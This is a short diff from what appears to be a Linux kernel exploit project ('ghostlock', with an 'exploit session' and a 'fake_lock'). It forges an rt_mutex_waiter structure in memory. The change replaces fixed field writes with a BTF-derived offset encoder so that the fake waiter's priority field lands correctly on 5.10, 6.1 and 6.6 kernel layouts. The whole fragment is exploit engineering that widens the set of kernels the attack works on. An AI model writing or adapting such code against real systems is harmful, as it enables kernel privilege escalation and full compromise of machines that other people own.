@@ -397,10 +397,17 @@ namespace ghostlock::support {
                     *request, write_layout);
                 put64(p, kernel::W0_OFF + 0x30, waiter_task); /* task */
                 put64(p, kernel::W0_OFF + 0x38, (session::g_exploit_session.heap.current.fake_lock)); /* lock */
-                put32(p, kernel::W0_OFF + 0x40, 0); /* wake_state */
-                put32(p, kernel::W0_OFF + 0x44, kernel::FAKE_WAITER_PRIO); /* prio */
-                put64(p, kernel::W0_OFF + 0x48, 0); /* deadline */
-                put64(p, kernel::W0_OFF + 0x50, 0); /* ww_ctx */
+                /* BTF-derived rt_mutex_waiter.prio offset (64 on 5.10, 68 on
+                 * 6.1); absent means the 6.1 layout. On 5.10 the waiter has
+                 * no wake_state/ww_ctx, so prio lands at +0x40 and nothing is
+                 * written past the 80-byte struct. */
+                (void) memory::encode_compact_waiter_tail(
+                    {
+                        reinterpret_cast<std::byte *>(p + kernel::W0_OFF),
+                        memory::kCompactWaiterTailBytes
+                    },
+                    v ? v->misc.waiter_prio.value_or(0x44) : 0x44,
+                    kernel::FAKE_WAITER_PRIO);
             } else {
                 /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
                 put64(p, kernel::W0_OFF + 0x00, 1);
